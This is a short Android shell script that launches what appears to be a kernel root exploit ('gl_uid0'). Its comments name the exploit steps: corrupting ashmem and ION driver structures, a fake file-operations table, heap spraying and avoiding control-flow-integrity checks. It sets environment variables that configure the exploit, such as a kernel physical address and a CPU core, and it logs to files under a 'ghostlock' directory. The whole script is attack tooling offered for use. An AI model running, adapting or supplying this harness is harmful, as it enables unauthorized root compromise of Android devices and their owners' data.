#!/system/bin/sh
# W1 ZERO_NAME leaf *ashmem_misc.name=0 (wait_lock)
# W2 ION_SAFE lock=MISC-8 parent=1 right=fake_fops → *MISC=table, no +8 llseek
# HOLD spray. SWAP_NOCFI: do not open from waiter (N13).
export MODE4_ONLY=1
export MODE4_ZI=1
export MODE4_SWAP_NOCFI=1
export MODE4_SWAP_HOLD=1
export KPHYS=0xa8000000
export CORE_SEL=7
export GHOSTLOCK_LIVE_SYNC=/sdcard/ghostlock/aarif/live_sync.log
export GHOSTLOCK_STAGE=/sdcard/ghostlock/aarif/stage.txt
export GHOSTLOCK_PROOF=/sdcard/ghostlock/aarif/proof.log
cd /data/local/tmp
echo START $(date) >> /data/local/tmp/zi_console.txt
exec /data/local/tmp/gl_uid0 >> /data/local/tmp/zi_console.txt 2>&1
